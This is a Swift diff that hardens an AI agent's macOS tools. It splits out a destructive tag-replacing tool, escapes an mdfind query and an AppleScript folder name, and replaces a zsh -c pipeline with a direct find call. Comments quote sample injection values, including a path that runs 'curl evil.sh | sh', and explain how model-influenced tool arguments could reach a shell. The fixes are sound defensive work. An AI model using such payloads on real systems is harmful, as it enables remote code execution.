@@ -128,12 +128,56 @@ struct ScreenCaptureTool: DevgenticTool {
     }
 }
 
-// MARK: - Finder Tags Tool
+// MARK: - Finder Tags Tools
+
+/// Replacing every Finder tag on a file — split from `finder_tags` on 2026-07-31.
+///
+/// The distinction that earns it a separate tool: `add` and `remove` are relative and leave
+/// untouched whatever they do not name, while this discards the existing set outright, and an
+/// empty `tags` array clears the file. A model that reaches for "set the tag to Important" does
+/// not necessarily intend "and drop Red, Work and the other four". Classified `.destructive`.
+struct ReplaceFinderTagsTool: DevgenticTool {
+    let name = "replace_finder_tags"
+    let category = "macOS Utilities"
+    let description = "Replaces ALL Finder tags on a file with the given list, discarding any existing tags. Pass an empty list to clear. Use finder_tags 'add'/'remove' to change tags without discarding the rest."
+
+    struct Arguments: Decodable, Sendable {
+        let path: String
+        let tags: [String]
+    }
+
+    var parameterSchema: ToolParameters {
+        return SchemaBuilder.object(
+            properties: [
+                ("path", "string", "File or folder path whose tags are being replaced."),
+                ("tags", "array", "The complete new tag list. Every existing tag not in it is removed.")
+            ],
+            required: ["path", "tags"]
+        )
+    }
+
+    func call(arguments: Arguments) async throws -> String {
+        let expandedPath = (arguments.path as NSString).expandingTildeInPath
+        guard FileManager.default.fileExists(atPath: expandedPath) else {
+            return "Error: File not found at '\(expandedPath)'."
+        }
+        let url = URL(fileURLWithPath: expandedPath) as NSURL
+
+        // Report what was discarded — otherwise the user approving this has no way to know what
+        // the file had, and neither does the model on a later turn.
+        let previous = (try? (url as URL).resourceValues(forKeys: [.tagNamesKey]))?.tagNames ?? []
+        try url.setResourceValue(arguments.tags, forKey: .tagNamesKey)
+
+        let now = arguments.tags.isEmpty ? "none" : arguments.tags.joined(separator: ", ")
+        let before = previous.isEmpty ? "none" : previous.joined(separator: ", ")
+        return "Replaced tags on '\(arguments.path)'. Was: \(before). Now: \(now)."
+    }
+}
 
 struct FinderTagsTool: DevgenticTool {
     let name = "finder_tags"
     let category = "macOS Utilities"
-    let description = "Manages macOS Finder tags on files and folders: read, add, remove, or search by tag. Supports both color tags and custom text tags."
+    let description = "Reads, adds, removes, or searches macOS Finder tags. Additive and subtractive only — replacing all tags is a separate tool."
 
     struct Arguments: Decodable, Sendable {
         let action: String
@@ -160,9 +204,9 @@ struct FinderTagsTool: DevgenticTool {
     var parameterSchema: ToolParameters {
         return SchemaBuilder.object(
             properties: [
-                ("action", "string", "Action: 'read' (get tags on file), 'add' (add tags), 'remove' (remove tags), 'set' (replace all tags), 'search' (find files by tag)."),
-                ("path", "string", "File or folder path (required for read/add/remove/set). For search, the directory to search in."),
-                ("tags", "array", "Tag names to add, remove, or set (e.g. ['Important', 'Red', 'Work'])."),
+                ("action", "string", "Action: 'read' (get tags on file), 'add' (add tags), 'remove' (remove tags), 'search' (find files by tag)."),
+                ("path", "string", "File or folder path (required for read/add/remove). For search, the directory to search in."),
+                ("tags", "array", "Tag names to add or remove (e.g. ['Important', 'Red', 'Work'])."),
                 ("search_tag", "string", "Tag name to search for (for 'search' action).")
             ],
             required: ["action"]
@@ -221,14 +265,13 @@ struct FinderTagsTool: DevgenticTool {
             return "Removed tags \(removeTags) from '\(path)'. Remaining: \(currentTags.isEmpty ? "none" : currentTags.joined(separator: ", "))"
 
         case "set":
-            guard let path = arguments.path, let tags = arguments.tags else {
-                return "Error: 'path' and 'tags' required for set."
-            }
-            let expandedPath = (path as NSString).expandingTildeInPath
-            let url = URL(fileURLWithPath: expandedPath) as NSURL
-
-            try url.setResourceValue(tags, forKey: .tagNamesKey)
-            return "Set tags on '\(path)' to: \(tags.isEmpty ? "none" : tags.joined(separator: ", "))"
+            // Split out to `replace_finder_tags` on 2026-07-31. `add` and `remove` are relative
+            // and preserve what they do not name; `set` discards every existing tag, and
+            // `tags: []` clears the file. That is a different kind of act from reading tags and
+            // should not share one `requiresConfirmation` with it.
+            return "Error: 'set' has moved to the `replace_finder_tags` tool, so it can carry its "
+                + "own confirmation setting. Use 'add' or 'remove' here to change tags without "
+                + "discarding the others."
 
         case "search":
             guard let searchTag = arguments.search_tag else {
@@ -238,7 +281,18 @@ struct FinderTagsTool: DevgenticTool {
 
             let process = Process()
             process.executableURL = URL(fileURLWithPath: "/usr/bin/mdfind")
-            process.arguments = ["-onlyin", searchPath, "kMDItemUserTags == '\(searchTag)'"]
+            // `mdfind` is a fourth interpreter: its argument is a QUERY language, not a plain
+            // string. `searchTag` sits inside single quotes there, so a tag containing `'` ends
+            // the literal and the rest is parsed as query syntax — a malformed or silently
+            // widened search (e.g. a tag of `x' || kMDItemUserTags == '*`). No shell is involved,
+            // so this is not RCE, but the query is not the one the caller asked for.
+            //
+            // Escape backslash first, then the quote, for the same reason `AppleScriptEscaping`
+            // does: otherwise the escapes introduced here would themselves be escaped.
+            let escapedTag = searchTag
+                .replacingOccurrences(of: "\\", with: "\\\\")
+                .replacingOccurrences(of: "'", with: "\\'")
+            process.arguments = ["-onlyin", searchPath, "kMDItemUserTags == '\(escapedTag)'"]
 
             do {
                 // ProcessRunner drains stdout AND stderr concurrently. This site piped
@@ -358,23 +412,69 @@ struct DiskUsageTool: DevgenticTool {
 
         case "largest_files":
             let searchPath = (arguments.path as NSString?)?.expandingTildeInPath ?? NSHomeDirectory()
-            let topN = arguments.top_n ?? 10
+            // Clamped: `top_n` only bounds a Swift `prefix` now, but an unbounded value would
+            // let one call return the entire tree.
+            let topN = max(1, min(arguments.top_n ?? 10, 200))
 
+            // `find` is invoked DIRECTLY, never through a shell.
+            //
+            // This used to build a `/bin/zsh -c` string with `searchPath` interpolated inside
+            // double quotes:
+            //     find "\(searchPath)" -type f … | sort -rh | head -\(topN)
+            // A `path` containing a double quote closes that quote and everything after it is
+            // shell syntax, so `/tmp" ; curl evil.sh | sh ; echo "` ran as its own command.
+            // `path` is a tool ARGUMENT supplied by the model, so anything able to influence
+            // the model reached a shell through a DISK-USAGE tool — one a profile withholding
+            // shell access would have no reason to suspect.
+            //
+            // `du`, `{}` and `+` are OUR literals in an argv we build, not shell words: `-exec`
+            // is a `find` predicate, so the batching (and its speed) survives the conversion
+            // intact. Only the `sort`/`head` pipeline had to move into Swift, which is where
+            // `glob_files` already applies its limit.
             let process = Process()
-            process.executableURL = URL(fileURLWithPath: "/bin/zsh")
-            process.arguments = ["-c", "find \"\(searchPath)\" -type f -not -path '*/.git/*' -not -path '*/node_modules/*' -not -path '*/DerivedData/*' -exec du -h {} + 2>/dev/null | sort -rh | head -\(topN)"]
+            process.executableURL = URL(fileURLWithPath: "/usr/bin/find")
+            process.arguments = [
+                searchPath, "-type", "f",
+                "-not", "-path", "*/.git/*",
+                "-not", "-path", "*/node_modules/*",
+                "-not", "-path", "*/DerivedData/*",
+                // `-k` not `-h`: kilobytes sort numerically. `-h` produced "1.2M"/"900K"
+                // strings that only `sort -rh` could order, and that was the reason for the
+                // shell pipeline in the first place.
+                "-exec", "du", "-k", "{}", "+",
+            ]
 
             do {
-                // ProcessRunner drains stdout AND stderr concurrently. This site piped
-                // stderr to a `Pipe()` nobody ever read — not a discard, a 64 KB buffer
-                // that hangs the child once full.
+                // stderr is ignored rather than redirected with `2>/dev/null`: `find` reports
+                // unreadable directories there and exits non-zero, which is not a failure of
+                // the search. ProcessRunner keeps the streams apart, so ignoring it needs no
+                // shell redirection.
                 let output = try ProcessRunner.run(process).standardOutput
-                    .trimmingCharacters(in: .whitespacesAndNewlines)
 
-                if output.isEmpty {
+                // `du -k` emits "<kilobytes>\t<path>" per line.
+                let entries: [(kb: Int, path: String)] = output
+                    .split(separator: "\n")
+                    .compactMap { line in
+                        let parts = line.split(separator: "\t", maxSplits: 1)
+                        guard parts.count == 2, let kb = Int(parts[0].trimmingCharacters(in: .whitespaces)) else {
+                            return nil
+                        }
+                        return (kb, String(parts[1]))
+                    }
+                    .sorted { $0.kb > $1.kb }
+                    .prefix(topN)
+                    .map { $0 }
+
+                if entries.isEmpty {
                     return "No files found in '\(searchPath)'."
                 }
-                return "Largest files in '\(searchPath)':\n\(output)"
+
+                let formatter = ByteCountFormatter()
+                formatter.countStyle = .file
+                let listing = entries
+                    .map { "\(formatter.string(fromByteCount: Int64($0.kb) * 1024))\t\($0.path)" }
+                    .joined(separator: "\n")
+                return "Largest files in '\(searchPath)':\n\(listing)"
             } catch {
                 return "Error: \(error.localizedDescription)"
             }
@@ -803,7 +903,12 @@ struct AppleNotesTool: DevgenticTool {
             let limit = arguments.limit ?? 20
             let folderClause: String
             if let folder = arguments.folder {
-                folderClause = "of folder \"\(folder)\""
+                // `escapeAppleScript`, like every other interpolation in this tool. This one
+                // site was raw: a `folder` value closing the string literal could append
+                // `do shell script "…"`, which is arbitrary command execution — the sibling
+                // `create` and `search` paths escaped identically-sourced values, so this was
+                // an omission rather than a design.
+                folderClause = "of folder \"\(Self.escapeAppleScript(folder))\""
             } else {
                 folderClause = ""
             }
@@ -954,9 +1059,10 @@ struct AppleNotesTool: DevgenticTool {
         }
     }
 
-    private static func escapeAppleScript(_ str: String) -> String {
-        return str.replacingOccurrences(of: "\\", with: "\\\\")
-                  .replacingOccurrences(of: "\"", with: "\\\"")
+    /// Retained as the name every call site in this tool already uses; the rule itself lives in
+    /// `AppleScriptEscaping` so `manage_safari_tabs` and this tool cannot drift apart.
+    static func escapeAppleScript(_ str: String) -> String {
+        return AppleScriptEscaping.escapeStringLiteral(str)
     }
 
     private static func escapeHTML(_ str: String) -> String {
